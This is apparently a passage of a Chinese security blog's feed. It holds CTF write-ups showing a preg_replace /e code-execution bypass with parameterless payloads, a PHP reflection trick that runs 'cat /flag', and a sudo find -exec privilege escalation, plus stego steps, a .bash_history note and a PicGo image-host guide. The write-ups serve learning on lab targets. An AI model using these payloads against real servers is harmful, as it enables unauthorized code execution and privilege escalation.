class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>上传脚本，服务器监听：</p><p><img src="https://s2.loli.net/2023/06/08/nrmGspPgaFUV4zA.png" alt="image-20230608210954717"></p><h3 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h3><p>按一下提交得源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;waf.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你是谁啊哥们？把钥匙给我！！！！&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br><span class="hljs-variable">$name</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-variable">$qaq</span>=<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;qaq&#x27;</span>]);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]))&#123;<br>  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$name</span>))<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你是&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;大人????&lt;br/&gt;&quot;</span>;<br>    <span class="hljs-variable">$name1</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/hahaha/e&#x27;</span>,<span class="hljs-variable">$qaq</span>,<span class="hljs-variable">$name</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;骗我的吧，你明明是    &gt;&gt;&gt;&gt;小小&quot;</span>.<span class="hljs-variable">$name1</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>注意看：<code>preg_replace(&#39;/hahaha/e&#39;,$qaq,$name)</code> 使用了 <code>/e</code> 参数，可能造成命令执行</p><blockquote><p>preg_replace()使用了 <code>/e</code>参数，如果在 $name中匹配到了 <code>hahaha</code> 就会执行 $qaq中的代码</p></blockquote><img src="https://s2.loli.net/2023/06/08/iXa91N7DZ2IebGo.png" alt="image-20230608211710704" style="zoom:50%;" /><p>当前目录存在 waf.php</p><p><img src="https://s2.loli.net/2023/06/08/kqd1YKEUnrmOe5c.png" alt="image-20230608211814177"></p><p>试了一下，发现 小数点 &#x2F; 等东西都被过滤了，可以使用 <strong>无参数rce</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">name=hahaha123&amp;qaq=<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>()))))<br></code></pre></td></tr></table></figure><p>获得waf.php函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[0-9]|get_defined_vars|getallheaders|next|prev|end|array_reverse|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;</span>, <span class="hljs-variable">$poc</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker! you die!&lt;br/&gt;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;666&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$poc</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>写到这有点不会了，查了一下无参数rce还有一种 <code>session_start()</code>的方式</p><p><img src="https://s2.loli.net/2023/06/08/GneCqrDIz469MWh.png" alt="image-20230608212131882"></p><p>使用session将 <code>/flag</code> 传过去：</p><p><img src="https://s2.loli.net/2023/06/08/VignboCa6e3XA9k.png" alt="image-20230608212232667"></p><h3 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h3><p>index.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;waf.php&quot;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">getFlag</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;password==<span class="hljs-string">&quot;‮⁦  //how to change the private variables⁩⁦secret&quot;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$a</span>));<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>robots.txt泄露：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">User-agent: *<br>Disallow: hint.php<br></code></pre></td></tr></table></figure><p>我们访问hint.php</p><p><img src="https://s2.loli.net/2023/06/08/KxQRyXs4DAFlO3L.png" alt="image-20230608212751510"></p><p>提示我们需要使用这些方法，结合 </p><p><img src="https://s2.loli.net/2023/06/08/1Fsb96wQyivnSKc.png" alt="image-20230608212844259"></p><p>我们知道了，我们需要使用反射，将源码复制到sublime中：</p><p><img src="https://s2.loli.net/2023/06/08/ZEl4n5vzWNpB6Mk.png" alt="image-20230608212931976"></p><p>发现参数又有不可见字符，我们需要url编码：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%E2</span><span class="hljs-variable">%80</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%2</span>F<span class="hljs-variable">%2</span>Fhow<span class="hljs-variable">%20</span><span class="hljs-keyword">to</span><span class="hljs-variable">%20</span>change<span class="hljs-variable">%20</span>the<span class="hljs-variable">%20</span><span class="hljs-keyword">private</span><span class="hljs-variable">%20</span>variables<span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%E2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%A6secret</span><br></code></pre></td></tr></table></figure><p>直接使用反射即可，注意：由于属性是private，所以我们需要 <code>setAccessible(true)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$flag</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">getFlag</span>();<br><span class="hljs-variable">$refl</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionObject</span>(<span class="hljs-variable">$flag</span>);<br><span class="hljs-variable">$pwd</span> = <span class="hljs-variable">$refl</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&quot;password&quot;</span>);<br><span class="hljs-variable">$pwd</span>-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$pwd</span>-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$flag</span>,<span class="hljs-string">&quot;%E2%80%AE%E2%81%A6%20%20%2F%2Fhow%20to%20change%20the%20private%20variables%E2%81%A9%E2%81%A6secret&quot;</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$refl</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&quot;cmd&quot;</span>);<br><span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$cmd</span>-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$flag</span>,<span class="hljs-string">&quot;cat /flag&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/06/08/izbNZtma3g587Qo.png" alt="image-20230608213943302"></p><h3 id="Esc4pe-T0-Mong0"><a href="#Esc4pe-T0-Mong0" class="headerlink" title="Esc4pe_T0_Mong0"></a>Esc4pe_T0_Mong0</h3><p>nodejs、沙箱逃逸</p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>zsteg一把梭</p><p><img src="https://s2.loli.net/2023/06/08/jTbitCFqHo6YWKV.png" alt="image-20230608214440271"></p><h3 id="可是雪啊飘进双眼"><a href="#可是雪啊飘进双眼" class="headerlink" title="可是雪啊飘进双眼"></a>可是雪啊飘进双眼</h3><p>把音频放进audacity</p><p><img src="https://s2.loli.net/2023/06/08/niMoATDdZxcVFak.png" alt="img"></p><p>这是莫斯电码，解码</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.--</span> <span class="hljs-params">---</span> <span class="hljs-string">.-</span> <span class="hljs-string">..</span> <span class="hljs-string">...</span> <span class="hljs-string">....</span> <span class="hljs-string">.-</span> -. -<span class="hljs-string">..-</span> <span class="hljs-string">..</span><br>WOAISHANXI<br></code></pre></td></tr></table></figure><p>然后结合 题目知，这是snow隐写：</p><p><img src="https://s2.loli.net/2023/06/08/72JMghKDwvBERlI.png" alt="image-20230608214844634"></p><p><code>shanxiroujiamo</code></p><p>解压压缩包，得到两张图片</p><p><img src="https://s2.loli.net/2023/06/08/lqIC7NjOFfbEmhK.png" alt="image-20230608215116631"></p><p><img src="https://s2.loli.net/2023/06/08/tcf6FdEinDkAl1q.png" alt="image-20230608214954094"></p><p>binwalk分离 key.jpg，得到另一张图片：</p><img src="https://s2.loli.net/2023/06/08/uSgZx7pCteFIOb2.png" alt="img" style="zoom:33%;" /><p>对照着上面的图片解密：<code>BC1PVEYD</code></p><p>然后使用steghide即可：</p><p><img src="https://s2.loli.net/2023/06/08/E5dbWwFRCrDBGIK.png" alt="image-20230608215152687"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>bash_history文件</title>
    <link href="/2023/08/24/bash_history%E6%96%87%E4%BB%B6/"/>
    <url>/2023/08/24/bash_history%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="bash-history-文件"><a href="#bash-history-文件" class="headerlink" title=".bash_history 文件"></a>.bash_history 文件</h2><p><code>.bash_history</code> 是一个隐藏文件，它<strong>保存了用户在命令行界面中输入的历史命令记录</strong>。当用户退出当前命令行终端时，系统会将当前的历史命令保存到 <code>.bash_history</code> 文件中，下次用户登录时，可以使用方向键等功能浏览并调用之前输入过的命令。</p><p><strong><code>.bash_history</code> 文件通常位于用户的主目录</strong>(<code>/home/xxx/.bash_history</code>)下，可以使用以下命令来查看该文件的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.bash_history<br></code></pre></td></tr></table></figure><p>也可以使用其他文本编辑器，如 <code>vi</code>、<code>nano</code> 等编辑器来查看和编辑该文件，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi ~/.bash_history<br></code></pre></td></tr></table></figure><p>需要注意的是，<code>.bash_history</code> 文件中包含了用户输入的所有命令记录，包括敏感信息，因此需要妥善保管。为了保护用户的隐私，可以使用 <code>history</code> 命令来清除或删除历史命令记录，也可以在用户的 <code>~/.bashrc</code> 文件中设置不记录历史命令等操作。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bash_history文件</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【HZNUCTF】findme</title>
    <link href="/2023/04/01/%E3%80%90HZNUCTF%E3%80%91findme/"/>
    <url>/2023/04/01/%E3%80%90HZNUCTF%E3%80%91findme/</url>
    
    <content type="html"><![CDATA[<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>我们访问网站发现如下提示：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">Please POST <span class="hljs-string">&#x27;shit&#x27;</span> <span class="hljs-keyword">to</span> /cmd<br></code></pre></td></tr></table></figure><p>提示我们需要post请求提交参数，访问 <code>/cmd</code> 目录</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012124518.png" alt="image-20230401212433415" style="zoom: 33%;" /><p>提示在环境变量中没有发现ls命令，于是我们使用绝对路径：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012126403.png" alt="image-20230401212627339" style="zoom:50%;" /><p>查看到了flag在根目录下面，于是我们使用 :</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">shit</span><span class="hljs-operator">=/</span>bin/cat flag<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012128020.png" alt="image-20230401212818951" style="zoom: 33%;" /><p>提示我们没有权限，于是我们使用命令：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">shit</span><span class="hljs-operator">=/</span>usr/bin/sudo -l<br></code></pre></td></tr></table></figure><p><code>sudo -l</code> 会显示出<code>sudo使用者</code>的权限</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012131905.png" alt="image-20230401213116794"></p><p>提示当前用户：<code>ctf</code> 在 <code>/usr/bin/find</code> 使用<code>sudo</code>可以不需要密码(<code>NOPASSWD</code>) </p><p><a href="https://knightyun.github.io/2019/06/20/sudo-nopasswd">linux中sudo免密码</a></p><p>我们查看一下根目录下 <code>start.sh</code> 内容：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">shit</span><span class="hljs-operator">=/</span>bin/cat start.sh<br></code></pre></td></tr></table></figure><p>start.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/bash</span><br><br><br>useradd ctf<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;ctf ALL=(root) NOPASSWD: /usr/bin/find&quot;</span> &gt; /etc/sudoers.d/ctf &amp;&amp; <span class="hljs-built_in">chmod</span> 0440 /etc/sudoers.d/ctf  <span class="hljs-comment"># 此处给个findNOPASSWD，并修改权限</span><br><br>su - ctf -c <span class="hljs-string">&quot;/main&quot;</span><br></code></pre></td></tr></table></figure><p>根据以上分析，我们需要知道<code>find命令</code>还可以<code>命令执行</code>：</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find flag -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> f* \;   <span class="hljs-comment"># 在bash环境下有特殊意义，因此利用反斜杠来转义</span><br></code></pre></td></tr></table></figure><p>在当前目录下找到flag文件，并且执行命令：<code>cat f*</code>，</p><p><strong>-exec和 ;之间就是find后的额外命令</strong></p><p>因此，我们可以使用sudo提权find，查看flag文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">shit=/usr/bin/sudo find /flag -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> flag \;<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304012144631.png" alt="image-20230401214440555" style="zoom: 33%;" />]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>使用picgo+github作为图床</title>
    <link href="/2023/03/31/%E4%BD%BF%E7%94%A8picgo+github%E4%BD%9C%E4%B8%BA%E5%9B%BE%E5%BA%8A/"/>
    <url>/2023/03/31/%E4%BD%BF%E7%94%A8picgo+github%E4%BD%9C%E4%B8%BA%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>经常写博客、markdown的人都会使用图床。图床是什么呢？其实相当于一个存储图片的网站，类似百度云这样，不过上传图片到图床后可以直接通过外链进行访问。</p><h3 id="工具选择"><a href="#工具选择" class="headerlink" title="工具选择"></a>工具选择</h3><p>此处我们使用图片上传工具：<code>PicGo</code></p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202303311942004.png" alt="image-20230331194215910" style="zoom: 67%;" /><p>这个工具可以将剪切板上的图片上传</p><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><h4 id="github配置"><a href="#github配置" class="headerlink" title="github配置"></a>github配置</h4><h5 id="1、创建仓库"><a href="#1、创建仓库" class="headerlink" title="1、创建仓库"></a>1、创建仓库</h5><p>首先我们需要登录github，然后创建一个仓库，点击右上角：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202303311945041.png" alt="image-20230331194545966"></p><h5 id="2、配置token-key"><a href="#2、配置token-key" class="headerlink" title="2、配置token key"></a>2、配置token key</h5><p>点击右上角设置，然后选择 <code>Developer settings</code></p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202303311948257.png" alt="image-20230331194814212"></p><p>然后产生一个token key</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202303311948229.png" alt="image-20230331194859183"></p><h4 id="PicGo配置"><a href="#PicGo配置" class="headerlink" title="PicGo配置"></a>PicGo配置</h4><p>将<code>token key</code>复制到<code>PicGo</code>上：</p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202303311950101.png" alt="image-20230331195022059" style="zoom:67%;" /><p><code>设定仓库名</code>按照“账户名&#x2F;仓库名的格式填写”，比如我的是：<code>leekosss/photoBed</code></p><p><code>分支名</code>统一填写“master”。</p><p><code>设定Token</code>将之前的Token粘贴在这里。</p><p><code>指定存储路径</code>留空。</p><p><code>自定义域名</code>的作用是在上传图片后成功后，PicGo会将“自定义<a href="https://cloud.tencent.com/act/pro/domain-sales?from=20065&from_column=20065">域名</a>+上传的图片名”生成的访问链接，放到剪切板上。默认留空也可以正常使用。这里为了使用CDN加快图片的访问速度，自定义域名我们按照这样去填写：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cdn.jsdelivr.net<span class="hljs-regexp">/gh/</span>GitHub用户名/仓库名<br></code></pre></td></tr></table></figure><p>这样就配置成功啦，我们的图片都会被上传到仓库中(2GB)，如果仓库满了，再创建一个就行：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202303311953301.png" alt="image-20230331195317256"></p>]]></content>
    
    
    <categories>
      
      <category>知识</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
